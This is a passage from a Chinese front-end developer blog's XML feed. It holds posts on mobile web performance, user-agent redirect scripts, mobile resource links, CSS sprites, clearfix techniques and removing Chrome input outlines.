Model）代表着更快的JavaScript执行效率。新的标签能很快地应用在包括移动端的新浏览器版本上，并且HTML5设计让那些不支持它的浏览器能平稳过渡使用新标签。&emsp;&emsp;HTML5的一些表单元素提供了许多新属性来完成原本需要javascript来完成的功能。例如，新的placeholder属性用于显示在用户输入进入输入框之前显示的介绍性文字，autofocus属性用于标示哪个输入框应当被自动定位。&emsp;&emsp;也有一些新的输入框元素能不用依靠Javascript就可以完成一些通用的需求。这些新的输入框类型包括像e-mail，URL，数字，范围，日期和时间这样需要复杂的用户交互和输入验证的元素。在移动浏览器上，当需要输入文本的时候，弹出的键盘通常是由特定的输入框类型来做选择的。不支持指定的输入类型的浏览器就会只显示一个文本框。&emsp;&emsp;另外，只要浏览器支持内建的层次，圆角，阴影，动画，过渡和其他的图片效果，CSS 3.0就能帮助你创建轻便简易的页面了，而这些图片效果原先是需要加载图片才能完成的。这样，这些新特性就能加速页面渲染了。&emsp;&emsp;有很多Web站点都提供哪些移动或者桌面浏览器支持哪项性能的更新说明。（例如：http://caniuse.com/ 和 mobilehtml5.org）。实现小贴士：&emsp;&emsp;需要进一步考虑。人工地做这些改动是非常复杂和耗时的。如果你使用CMS，它可以帮你生成许多你不需要控制的HTML和CSS。优化客户端的程序处理&emsp;&emsp;浏览器按照什么顺序来执行代码生成一个页面，和页面复杂性及JavaScript的技术选择，都对性能有很大的影响。特别在客户端相对较慢的CPUs和少内存的移动端中尤为明显。下面的章节提供一些策略来提升页面处理的性能。延迟渲染”BELOW-THE-FOLD”内容&emsp;&emsp;可以确定的是如果我们将不可见区域的内容延迟加载，那么页面就会更快地展现在用户面前，这个区域叫做”below the fold”。为了减少页面加载后需要重新访问的内容，可以将图片替换为正确的高宽所标记的标签。实现小贴士：&emsp;&emsp;平稳处理。一些好的Javascript库可以用来处理这些below-the-fold 延迟加载的图像。^12延迟读取和执行的脚本&emsp;&emsp;在一些移动设备上，解析Javascript代码的速度能达到100毫秒每千字节。许多脚本的库直到页面被渲染以后都是不需要的加载的。下载和解析这些脚本可以很安全地被推迟到onload事件之后来做。例如，一些需要用户交互的行为，比如托和拽，都不大可能在用户看到页面之前被调用。相同的逻辑也可以应用在脚本执行上面。尽量将脚本的执行延迟到onload事件之后，而不是在初始化页面中重要的可被用户看到的内容的时候执行。&emsp;&emsp;这些延迟的脚本可能是你自己写的，更重要的是，也有可能是第三方的。对广告、社交媒体部件、或者分析的差劲的脚本优化会导致阻塞页面的渲染，会增加珍贵的加载时间。当然，你需要小心地评估诸如jquery这样为移动网站设计的大型脚本框架，特别当你仅仅只是使用这些框架中的一些对象的时候更要小心评估。实现小贴士：&emsp;&emsp;平稳处理。许多第三方的框架现在提供延迟加载的异步版本的API。开发者只需要将原先的逻辑转化到这个异步版本。一些JavaScript要做延迟加载会有些复杂，因为在onload之后执行这些脚本需要注意很多注意事项。（例如，你有个脚本需要绑定到onload事件上，你需要做什么？如果你将脚本延迟到onload事件之后，就一定就会失去很多执行的时机。）使用Ajax来增强进程&emsp;&emsp;Ajax（Asynchronous JavaScript and XML）是一项使用XHR（XMLHttpRequest）对象来从Web服务器上获取数据的技术，它并不需要更新正在运行的页面。Ajax能更新页面上的某个部分而不需要重新构建整个页面。它通常用来提交用户的交互相应，但是也可以用来先加载页面的框架部分，然后当用户准备好浏览网页的时候再填充详细的内容。&emsp;&emsp;尽管是这个名字，但是XMLHttpRequest并不强制要求你只能使用XML。你可以通过调用overrideMineType方法来制定”application/json”类型来使用json替换XML。使用JSON.parse会比使用原生的eval()函数快了几乎两倍，并且更为安全。&emsp;&emsp;同时，切记Ajax的返回响应也会得益于那些应用在普通的返回响应的优化技术上面。确保对你的Ajax返回响应使用了缓存头，简化，gzip压缩，资源合并等技术。实现小贴士：&emsp;&emsp;由于这个技术是根据具体应用不同而不同的，所以很难量化。或许由于跨域问题，你需要使用XHR2，这个技术能使用外部域的资源，从而能进行跨域的XHR请求。根据网络状况进行适配处理&emsp;&emsp;由于使用更多带宽会使用更多移动网络的费用，所以只有能检测网络的类型才能使用针对特定网络的优化技术。例如，预加载未来使用到的请求是非常聪明的做法，但是如果用户的带宽很稀有，并且加载的有些资源是永远不会用到的话，这个技术就是不合理的了。&emsp;&emsp;在Android 2.2+，navigator.connection.type属性的返回值能让你区分Wifi和2G/3G/4G网络。在Blackberry上，blackberry.network也能提供相似的信息。另外，服务端通过检测请求中的User-Agent头或者其他的嵌入到请求中的信息能让你的应用检测到网络状况。实现小贴士：&emsp;&emsp;需要进一步考虑。检测网络信息的API最近已经有所变化了。^11 接口现在不是直接定义Wi-Fi，3G等网络状况，而是给出了带宽信息和诸如“非常慢，慢，快和非常快”这样的建议。有个属性能给出估计的MB/s值和一个“meterd”的Boolean值来表示它的可信度，但是对浏览器来说，很难根据这个来判断环境。判断当前网络环境然后适配仍然是一种最好的方法，但是这种方法正在被考虑被替换。对多线程来说尽量使用HTML5的WEB WORKER特性&emsp;&emsp;HTML5中的Web Worker是使用多个线程并发执行Javascript程序。另外，这种特别的多线程实现能减少困惑开发者多年的，在其他平台上遇到的问题。例如，当一个线程需要改变一个正在被其他线程使用的资源该如何处理。在Web Worker中，子线程不能修改主用户界面（UI）线程使用的资源。&emsp;&emsp;对提高移动站点的性能来说，Web Worker中的代码很适合用来预处理用户完成进一步操作所需要的资源的，特别是在用户的带宽资源不紧缺的情况下。在低处理器性能的移动设备上，过多的预加载可能会干扰当前页面的UI响应。使用多线程代码，让Web Worker对象（并且尽可能使用localStorage来缓存数据）在另外一个线程中操作预加载资源，这样就能不影响当前的UI表现了。&emsp;&emsp;要特别说明的是，Web Worker只在Android 2.0以上的版本实现，而且iphone上的ios5之前的版本也不支持。在桌面PC上，总是落后的IE只在IE 10才支持Web Worker。实现小贴士：&emsp;&emsp;平稳过渡。虽然这项技术并不是非常难实现，但是对Web Workers来说，有一些限制需要强制遵守。Web Workers不能进入到页面的DOM，也不能改变页面上的任何东西。Web Worker很适合那种需要后台计算和处理的工作。将CLICK事件替换成TOUCH事件&emsp;&emsp;在触摸屏设备上，当一个用户触碰屏幕的时候，onclick事件并没有立即触发。设备会使用大约半秒（大多数设备差不多都是300毫秒）来让用户确定是手势操作还是点击操作。这个延迟会很明显地影响用户期望的响应性能。要使用touchend事件来替换才能解决。当用户触碰屏幕的时候，这个事件会立即触发。&emsp;&emsp;为了要确保不会产生用户不期望的行为，你应该也要使用touchstart和touchmove事件。例如，除非同时有个touchstart事件在button上，否则不要判断touchend事件在button上就意味着点击行为 — 因为用户有可能从其他地方触碰开始，然后拖拽到button上触碰结束的。你也可以在touchstart事件之后使用touchmove事件来避免将touchend事件误判为点击，当然前提是需要假设拖拽的手势并不是预期产生点击行为。&emsp;&emsp;另外，你也需要去处理onclick事件来让浏览器改变button的外观从而标识为已点击的状态，同时你也需要处理那些不支持touch事件的浏览器。为了避免代码在touchend和onclick代码中重复执行，你需要在确保用户触碰事件已经在touchend执行了之后，在click事件中调用preventDefault和stopPropagation方法。^4实现小贴士：&emsp;&emsp;需要进一步考虑。这种技术需要更多工作才能在一个页面中增加和维护链接。touch事件的代码必须考虑其他手势，因为替换click的还有可能是缩放或者敲击动作。支持SPDY协议&emsp;&emsp;应用层HTTP和HTTPS协议导致的一些性能瓶颈，使得不论是桌面还是移动端的网站都非常难受。在2009年，谷歌开始研发一种叫做SPDY（谐意是”speedy”）的协议来替换已有的协议，这种协议宣称能突破这些限制。这个协议的目标是让多种浏览器和多种Web服务都能支持，所以这个协议是开源的，但是初步地，只有Google的Chrome浏览器（在版本10及之后的）和google的站点支持。一旦一个Web服务支持SPDY，那么它上面的所有站点都可以和支持这个协议的浏览器使用SPDY进行交互。将SPDY应用在25个top100的Internet网站上，Google收集到的数据是网站的速度会改善27%到60%不等。^2&emsp;&emsp;SPDY自动使用gzip压缩所有内容，和HTTP不同的是，它连header的数据也使用gzip压缩。SPDY使用多线程技术让多个请求流或者响应流能共用一个TCP连接。另外SPDY允许请求设置优先级，比如，页面中心的视频会比边框的广告拥有更高的优先级。&emsp;&emsp;或许SPDY中最变革性的发明就是流是双向的，并且可以由客户端或者服务端发起，这样能使得信息能推送到客户端，而不用由客户端发起第一次请求。例如，当一个用户第一次浏览一个站点，还没有任何站点的缓存，这个时候服务端就可以在响应中推送所有的请求资源，而不用等候每个资源被再次独立请求了。作为替换协议，服务端可以发送暗示给客户端，提示页面需要哪些资源，同时也允许由客户端来初始化请求。即使是使用后一种这样的方式也比让客户端解析页面然后自己发现有哪些资源需要被请求来得快。&emsp;&emsp;虽然SPDY并没有对移动端有什么特别的设置，但是移动端有限的带宽就使得如果支持SPDY的话，SPDY在减少移动网站的延迟是非常有用的。实现小贴士：&emsp;&emsp;依据网站和服务的环境来进行平稳操作或进一步考虑。Google有一个SPDY模块支持Apache2.2–mod_spdy–这个模块是免费的；但是mod_spy有线程上的问题，并且和mod_php协作并不是很好，所以要求你使用这个技术的时候要确保你的网站的正常运行。永远别忘记测试！&emsp;&emsp;如果缺少了持续和仔细的测试提醒，性能的优化就只是讨论而已，是无法完成的。如果没有指定基准做比较，你系统上的任何改动都仅仅是理论而已。如果没有真实的测试数据，猜测性能的瓶颈是毫无意义的。&emsp;&emsp;有很多开源和通用的工具能进行集成测试，并且能进行不同地域和带宽/延迟的测试。另外，RUM（real user monitoring）工具能将测试环境从实验室变成不可预测的真实用户行为。&emsp;&emsp;观察移动设备的测试选择和桌面场景一样。如果你在选择一个自动化的解决方案，请确保使用一个能持续测试，并且能区分出应用优化方法前后的变化的解决方案。&emsp;&emsp;如果性能优化如果只是在发展过程中的一个步骤而已，它不会有什么效果的。它必须成为一个持续改善网站的一部分。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js移动设备手机跳转地址代码]]></title>
    <url>%2F2015%2F07%2F14%2Fjs%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E6%89%8B%E6%9C%BA%E8%B7%B3%E8%BD%AC%E5%9C%B0%E5%9D%80%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[1234567891011121314if(/AppleWebKit.*mobile/i.test(navigator.userAgent) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(navigator.userAgent)))&#123; if(window.location.href.indexOf("?mobile")&lt;0)&#123; try&#123; if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent))&#123; window.location.href="手机页面"; &#125;else if(/iPad/i.test(navigator.userAgent))&#123; window.location.href="平板页面"; &#125;else&#123; window.location.href="其他移动端页面" &#125; &#125;catch(e)&#123;&#125; &#125;&#125;另外的三种：版本1123456789101112131415161718&lt;script language="javascript"&gt; //平台、设备和操作系统 var system =&#123; win : false, mac : false, xll : false &#125;; //检测平台 var p = navigator.platform; system.win = p.indexOf("Win") == 0; system.mac = p.indexOf("Mac") == 0; system.x11 = (p == "X11") || (p.indexOf("Linux") == 0); //跳转语句，如果是手机访问就自动跳转到grycheng.com页面 if(system.win||system.mac||system.xll)&#123; &#125;else&#123; window.location.href="http://grycheng.com"; &#125; &lt;/script&gt;版本212345678910111213141516171819&lt;script language="javascript"&gt; function is_mobile() &#123; var regex_match = /(nokia|iphone|android|motorola|^mot-|softbank|foma|docomo|kddi|up.browser|up.link|htc|dopod|blazer|netfront|helio|hosin|huawei|novarra|CoolPad|webos|techfaith|palmsource|blackberry|alcatel|amoi|ktouch|nexian|samsung|^sam-|s[cg]h|^lge|ericsson|philips|sagem|wellcom|bunjalloo|maui|symbian|smartphone|midp|wap|phone|windows ce|iemobile|^spice|^bird|^zte-|longcos|pantech|gionee|^sie-|portalmmm|jigs browser|hiptop|^benq|haier|^lct|operas*mobi|opera*mini|320x320|240x320|176x220)/i; var u = navigator.userAgent; if (null == u) &#123; return true; &#125; var result = regex_match.exec(u); if (null == result) &#123; return false &#125; else &#123; return true &#125; &#125; if (is_mobile()) &#123; document.location.href= 'http://grycheng.com'; //修改http://grycheng.com为你所需跳转目标页地址 &#125;&lt;/script&gt;版本3 百度webapp版12345678910111213141516171819202122232425262728293031323334&lt;!---识别手机或电脑的js开始---&gt;&lt;script language="javascript"&gt; (function()&#123; var res = GetRequest(); var par = res['index']; if(par!='gfan')&#123; var ua=navigator.userAgent.toLowerCase(); var contains=function (a, b)&#123; if(a.indexOf(b)!=-1)&#123;return true;&#125; &#125;;//将下面的http://grycheng.com改成你的wap手机版页面地址 如我的 http://grycheng.com var toMobileVertion = function()&#123; window.location.href = 'http://grycheng.com/' &#125; if(contains(ua,"ipad")||(contains(ua,"rv:1.2.3.4"))||(contains(ua,"0.0.0.0"))||(contains(ua,"8.0.552.237")))&#123;return false&#125; if((contains(ua,"android") &amp;amp;&amp;amp; contains(ua,"mobile"))||(contains(ua,"android") &amp;amp;&amp;amp; contains(ua,"mozilla")) ||(contains(ua,"android") &amp;amp;&amp;amp; contains(ua,"opera")) ||contains(ua,"ucweb7")||contains(ua,"iphone"))&#123;toMobileVertion();&#125; &#125;&#125;)();function GetRequest() &#123; var url = location.search; //获取url中"?"符后的字串 var theRequest = new Object(); if (url.indexOf("?") != -1) &#123; var str = url.substr(1); strs = str.split("&amp;amp;"); for(var i = 0; i &lt; strs.length; i ++) &#123; theRequest[strs[i].split("=")[0]]=unescape(strs[i].split("=")[1]); &#125; &#125; return theRequest;&#125;&lt;/script&gt;&lt;!---识别手机或电脑的js结束---&gt;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>手机跳转地址</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端资源集锦]]></title>
    <url>%2F2015%2F07%2F14%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E8%B5%84%E6%BA%90%E9%9B%86%E9%94%A6%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;前端开发很多知识不学习就落后了，尤其是移动端发展更是迅速，随着市场的逐步扩大和相关技术的日趋完善，各种问题和解决方案也层出不穷。当然最主要的还是css3和HTML5的知识，javascript的内容也越来越丰富，有nodejs等。下面推荐一些收集移动端的知识精华。1. 知识集合99移动端知识集合：https://github.com/jtyjty99999/mobileTech司徒正美移动端知识集合：https://github.com/RubyLouvre/mobileTech优化移动体验的HTML5技巧：http://www.oschina.net/translate/mobile-app-optimization-and-performanceHTML5 Boilerplate：http://html5boilerplate.com/自适应网页设计：http://www.zhihu.com/question/19551815http://www.ruanyifeng.com/blog/2012/05/responsive_web_design.html移动端事件库：http://eightmedia.github.io/hammer.js/支持移动端的框架：http://webix.com移动端UI入门知识大集合：http://www.xueui.cn/ui-tutorial-collection/当耐特：http://www.cnblogs.com/iamzhanglei/他出了一本书叫：html5实验室-Canvas世界2. 书籍分享响应式web设计http://book.douban.com/subject/20390374/2).HTML5 与 CSS3 权威指南http://book.douban.com/subject/6025285/包括html5,css3完整的基础入门书籍3). HTML5 Canvas游戏开发实战http://book.douban.com/subject/23820912/这书前半部分是canvas基础，后半部分是游戏的示例。4). HTML5高级程序设计http://book.douban.com/subject/5402708/根据目录大家可能也看出来了，这是一本基础入门的书籍。3. 工具分享1). 测试工具多界面设备测试Opera多终端界面模拟其它辅助工具2). 开发工具webstorm]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动端资源</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手机端CSS Sprite图标定位分析]]></title>
    <url>%2F2015%2F07%2F14%2F%E6%89%8B%E6%9C%BA%E7%AB%AFcss-sprite%E5%9B%BE%E6%A0%87%E5%AE%9A%E4%BD%8D%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;今天在某个群里面闲逛，看见一个童鞋分享了一个携程的移动端的页面。地址这里我也分享下吧：http://m.ctrip.com/html5/&emsp;&emsp;在手机端我都很少用雪碧图合并定位图标，用的比较多就是用字体图标来代替，有些图标不多的时候就自己单个的切出来控制了。&emsp;&emsp;看了下携程的手机端的网站这些图标是用了雪碧图来合并的，因为一直以来手机端的屏幕大小不一，所以通常都会把设计图等比例缩放的形式展现，百分比的方式来布局，达到自适应。下面我们就来说说这个携程手机端的案例吧：&emsp;&emsp;首先这个雪碧图的原理与PC端的是一样的，只不过手机端的要按比例缩放一下。首先是合并的雪碧图：大家发现没有，雪碧图的尺寸与原图刚好缩放了2倍。&emsp;&emsp;再个就是原始 宽度和高度，以及图标的坐标位置。很明显通常元素的宽度和高度也就是要显示的图标的宽度和高度，这里也要缩放2倍。&emsp;&emsp;下面的图就是其中某个显示图标元素，包括宽度、高度和左边值刚好都是缩放过2倍的，所以看到这里都明白了吧，手机端的雪碧图就是这么做的，也挺简单的吧，比PC端就是多了一步缩放的计算，哈哈。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>手机端sprite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS获取自身所在文件的目录路径]]></title>
    <url>%2F2015%2F07%2F14%2Fjs%E8%8E%B7%E5%8F%96%E8%87%AA%E8%BA%AB%E6%89%80%E5%9C%A8%E6%96%87%E4%BB%B6%E7%9A%84%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84%2F</url>
    <content type="text"><![CDATA[很多时候我们都需要在js文件中获取该文件的详细路径，以便根据其他文件与该js的相对位置计算并设置其他一些文件如图片或样式或脚本的目录路径。我们一般都这样做：假设外部js文件的文件名为：test.js，则在test.js中都这样写：12345678var js=document.scripts;var jsPath;for(var i=0;i&lt;js.length;i++)&#123;if(js[i].src.indexOf("test.js")&gt;-1)&#123;jsPath=js[i].src.substring(0,js[i].src.lastIndexOf("/")+1);&#125;&#125;alert(jsPath);或者为了提高效率，这样写12345678var js=document.scripts;var jsPath;for(var i=js.length;i&gt;0;i--)&#123;if(js[i-1].src.indexOf("test.js")&gt;-1)&#123;jsPath=js[i-1].src.substring(0,js[i-1].src.lastIndexOf("/")+1);&#125;&#125;alert(jsPath);这种思路很清晰，根据文件名获取引用的文件的src属性并进行判断截取即可。但这种办法有以下两个缺点：1、需要遍历页面的js文件，有时可能效率会比较低。2、如果页面中出现目录不同的重名的js文件则可能判断错误。其实我们可以有更简单的办法来准确获取路径，这是在一次js测试突然发现并幡然醒悟的。123var js=document.scripts;js=js[js.length-1].src.substring(0,js[js.length-1].src.lastIndexOf("/")+1);alert(js);直接使用js.length？这会正确吗？其实仔细想想，由于判断路径的js代码一般都直接放在js文件中而不是函数中，所以当加载该js文件时会立即执行其中的语句，而执行此语句时所获取到的js文件数目正好是js.length-1，因为页面后面的js文件还没有加载，所以该处的js文件获取的数目并不是页面所有的js文件的数目。这样一来，获取路径就无需再遍历了，而且文件判断也无需文件名，判断更加准确(js.length-1永远都是其文件本身)。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js路径</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[input搜索框制作]]></title>
    <url>%2F2015%2F07%2F13%2Finput%E6%90%9C%E7%B4%A2%E6%A1%86%E5%88%B6%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[我们需要制作这样一个搜索框：首先我先抛出制作这个搜索框的细节：1）文本输入框要有内阴影。2）文本框与按钮要对齐。好，我们现在开始制作，先说一下，最直接的制作方法，文本输入框的内阴影我们可以用图片来做，用几像素的图片平铺，然后一个DIV层内包含input与button两个标签，大致HTML标签书写如： 谷歌搜索这样写虽然实现了想要的效果，但是我们会发现，在IE浏览器下，input与button始终会有1像素的错位，如图：如果我们要达到满意的效果，就要用到各IE浏览器的hack，造成我们将来维护成本的加大，并且，如果阴影用图片的话，像这样的小图会越来越多，如果用CSS3来实现内阴影，我们的PM肯定会跑来和我们说，你看浏览器的表现不一致，有的有阴影，有的没有，你要是说我们只有高浏览器支持阴影，低版本浏览器不支持阴影，我们的PM会说，我们要的是全浏览器保持一致，坑爹呀，为什么就这么执着呢？不过要求严格，才能使我们进步嘛！那我们就使用另一个方法来实现，首先，我们的文本框用一个DIV来模拟，然后将input的边框与背景都设置为none，这样就不会出现错位的现象了；接着我们就来处理文本框的内阴影，我们用两个DIV来控制，一般像这样的阴影基本上2像素就能达到效果了，所以我们将X轴的DIV设置上border与下border，Y轴的DIV设置左border与右border，然后定位到用于模拟input的层内，一个完美的input框就制作完成了，阴影CSS代码如下：12.search-field .shadow-x&#123; position:absolute;top:0;left:1px;width:438px;height:0;border-top:1px solid #d0d0d0;border-bottom:1px solid #f0f0f0;overflow:hidden;z-index:1; &#125;.search-field .shadow-y&#123; position:absolute;top:0;left:0;width:0;height:30px;border-left:1px solid #d0d0d0;border-right:1px solid #f0f0f0;overflow:hidden; &#125;阴影HTML代码如下：123456789&lt;div id="search-field"&gt;&lt;form id="search-form"&gt;&lt;div style="search-input"&gt;&lt;div style="shadow-x"&gt;&lt;/div&gt;&lt;div style="shadow-y"&gt;&lt;/div&gt;&lt;input type="text" /&gt;&lt;/div&gt;&lt;button type="submit"&gt;谷歌搜索&lt;/button&gt;&lt;/div&gt;完成后，这个搜索框在视觉上与我们想要的效果一般无二]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>input制作</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[清除浮动方法总结（clearfix剖析）]]></title>
    <url>%2F2015%2F07%2F13%2F%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%EF%BC%88clearfix%E5%89%96%E6%9E%90%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;浮动是一个有意思（你也可以说它很麻烦）的CSS属性，任何元素设置了浮动，层级就提高了，会影响它后面没设置浮动的元素，这些倒霉的被影响者会跑到浮动层的下面去（当然IE6、IE7除外），代码看起来是这样：12&lt;div style="width: 100px; height: 100px; border: 1px solid #333; float: left;"&gt;&lt;/div&gt;&lt;div style="width: 120px; height: 140px; background: #eee;"&gt;&lt;/div&gt;效果：&emsp;&emsp;因为设置了浮动的元素会提高层级，所以如果一个平淡无奇的父级元素（没有设置浮动或别的提高层级的属性）居然包住了一个浮动的家伙，并且这个父级还没有设置高，那它就悲催了，因为父级没法包住它的子级浮动元素（当然IE6、IE7又除外）：123&lt;div style="width: 160px; border: 1px solid #333; padding: 10px;"&gt;&lt;div style="width: 120px; height: 140px; background: #eee; float: left;"&gt;&lt;/div&gt;&lt;/div&gt;如图：那怎么样才能让父级包住浮动层呢？下面是我列举的一些方法，如有大家还有其他的办法，欢迎补充：1. 在浮动层下，设置空DIV，代码如下：1234&lt;div style="width: 160px; border: 1px solid #333; padding: 10px;"&gt;&lt;div style="width: 120px; height: 140px; background: #eee; float: left;"&gt;&lt;/div&gt;&lt;div style="clear: both; height: 0; font-size: 1px;"&gt;&lt;/div&gt;&lt;/div&gt;说明：clear: both;可以让元素不受到浮动层影响，排到浮动层的底下，而父级可以包住最底下这个空DIV，这样看起来，它似乎也就包住那个浮动层了，其实是障眼法哈～缺点：IE6下会多出1像素来，并且设置了无语义的空DIV；2. 在父级设置：overflow: hidden;123&lt;div style="width: 160px; border: 1px solid #333; padding: 10px; overflow: hidden;"&gt;&lt;div style="width: 120px; height: 140px; background: #eee; float: left;"&gt;&lt;/div&gt;&lt;/div&gt;说明：overflow: hidden; 用它是为了提高父级的层级，层级提高了，自然能包住子级浮动元素了。缺点：要是父级里面有什么元素居然飘到父级以外的地方，那就悲剧了，例如很多JS的提示层效果就不能用 overflow: hidden;3. 在父级设置：float;123&lt;div style="width: 160px; border: 1px solid #333; padding: 10px; float: left;"&gt;&lt;div style="width: 120px; height: 140px; background: #eee; float: left;"&gt;&lt;/div&gt;&lt;/div&gt;说明：父级包不住浮动层，因为层级不够，那父级也设置float好喽缺点：父级如果也有父级，也要设置浮动，那用这种方法，一路浮动到body那儿才算完事儿～～呃。。此方法本身就很滑稽4. 在父级设置：display: inline-block;123&lt;div style="width: 160px; border: 1px solid #333; padding: 10px; display: inline-block;"&gt;&lt;div style="width: 120px; height: 140px; background: #eee; float: left;"&gt;&lt;/div&gt;&lt;/div&gt;说明：inline-block; 是一个不兼容的属性，但用在这里只是为了提高父级层级，如此一来，可以完全忽略它的不兼容性哈～缺点：设置不了元素居中：margin-left: auto; margin-right: auto; 你可以在不需要居中的元素上使用这方法哈～5. 父级如果是绝对定位：position: absolute;123&lt;div style="width: 160px; border: 1px solid #333; padding: 10px; position: absolute;"&gt;&lt;div style="width: 120px; height: 140px; background: #eee; float: left;"&gt;&lt;/div&gt;&lt;/div&gt;说明：要说层级，那绝对定位必定是老大，在绝对定位眼中，小小的浮动也居然敢称层级？？缺点：position: absolute;会影响布局，它是相对父级的块元素为参照物进行定位，完全不按文档流的方式走，呵呵，所以如果你要是在绝对定位的元素里设置浮动，那就尽情设置吧,不必理会任何浮动神马的，因为在绝对定位下，浮动啥的，真的是浮云了～6. 给浮动层下设置：1234&lt;div style="width: 160px; border: 1px solid #333; padding: 10px;"&gt;&lt;div style="width: 120px; height: 140px; background: #eee; float: left;"&gt;&lt;/div&gt;&lt;br clear="all" /&gt;&lt;/div&gt;7. 给父级加上这行吧1234567.clear:after &#123; content: '\20'; clear: both; display: block; &#125;&lt;style&gt;.clear:after &#123; content: '\20'; clear: both; display: block; &#125;&lt;/style&gt;&lt;div style="width: 160px; border: 1px solid #333; padding: 10px;" class="clear"&gt;&lt;div style="width: 120px; height: 140px; background: #eee; float: left;"&gt;&lt;/div&gt;&lt;/div&gt;说明：:after 是一个很好用的属性，有了它，可以往任何元素里插入字符串、空格啦，’.’之类的，但可惜，IE6，IE7不认识:after，不过，又有什么关系呢？反正IE6\IE7的父级能包住浮动层，所以不必管它们喽～忘了解释了，先给浮动层底下插入一个空格（content: ‘\20’;），再把这个空格转成块元素，并且清除浮动层的影响，让父级包住这个空格，也是障眼法哈～最后的结果都会是：参与测试的浏览器列表：补充常用清楚浮动方法12345678910111213141516.clearfix:after &#123;content: ".";display: block;clear: both;overflow:hiddden;visibility: hidden;height: 0;&#125;.clearfix &#123;display: inline-block;&#125;* html .clearfix &#123;height: 1%;&#125;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>clearfix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[底层的DIV使用height:auto无效解决方案]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%BA%95%E5%B1%82%E7%9A%84div%E4%BD%BF%E7%94%A8heightauto%E6%97%A0%E6%95%88%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;style&gt;#main_center&#123;margin:8px 8px auto 8px;height:auto;background:#093;&#125;.main_center_left&#123;width:160px;float:left;background:#333;height:400px;margin-right:10px;&#125;.main_center_right&#123;width:783px;float:right;background:#906;height:400px;&#125;.main_center_right_side&#123;width:200px;float:right;background:blue;height:400px;&#125;.center_news&#123;width:573px;margin-right:10px;float:left;height:400px;background:#666;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="main_center"&gt;&lt;div class="main_center_left"&gt;160width&lt;/div&gt;&lt;div class="main_center_right"&gt;&lt;div class="center_news"&gt;&lt;/div&gt;&lt;div class="main_center_right_side"&gt;200width&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&emsp;&emsp;此时height:auto;和height:400px;是无效的，div不会显示高度。这是浮动导致的第一种方法，可以直接清除页面的浮动，代码量不多的时候很容易发现哪里没有清除浮动（亲们使用了浮动的时候一定要记得清除浮动哦，否则可能将会有很多类似的怪异问题出现！）。第二种方法，跟第一种方法有异曲同工之处，height:auto;(height:400px;)可以换成zoom:1;overflow:hidden;zoom:1会触发ie（ie8以下）的haslayout，刚好能清理浮动。另外，height:400px;同zoom:1;一样会触发ie（ie8以下）的haslayout，但auto值却不会。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>height:auto无效</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[去掉chrome(谷歌)浏览器默认的input、textarea的边框(border)和背景(background)]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%8E%BB%E6%8E%89chrome%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E9%BB%98%E8%AE%A4%E7%9A%84input%E3%80%81textarea%E7%9A%84%E8%BE%B9%E6%A1%86border%E5%92%8C%E8%83%8C%E6%99%AFbackground%2F</url>
    <content type="text"><![CDATA[1、使用Chrome的都知道，当鼠标焦点在input、textarea这些元素上时，Chrome默认的会给它们加上黄色的边框，我以前一直以为这是chrome的特性，没法去掉，原来是css的效果，outline这个属性。你可以用下面的css代码去掉所有元素的边框：:focus {outline: none;}用下面的代码去掉你要去掉的元素的边框：.nohighlight:focus { outline:none; }你也可以给元素增加你希望的边框：.changeborder:focus { outline:Blue Solid 4px; }2、用chrome登录了一次并记录了COOKIES之后，再次打开，CHROME记录了上次输入的内容，背景图片就会被覆盖一层淡黄色的背景色， 点击一下鼠标，背景图片才显示出来。这个怎么解决呢？我当时碰到这个问题的时候，也很头疼，至今都没有发现有什么好的办法。有发现的请分享一下。3、chrome默认用户可以控制textarea的大小，在CSS中加入下面一句就可以了textarea {resize:none;}]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>background</tag>
        <tag>border</tag>
        <tag>iinput</tag>
        <tag>textarea</tag>
      </tags>
  </entry>
  <entry>
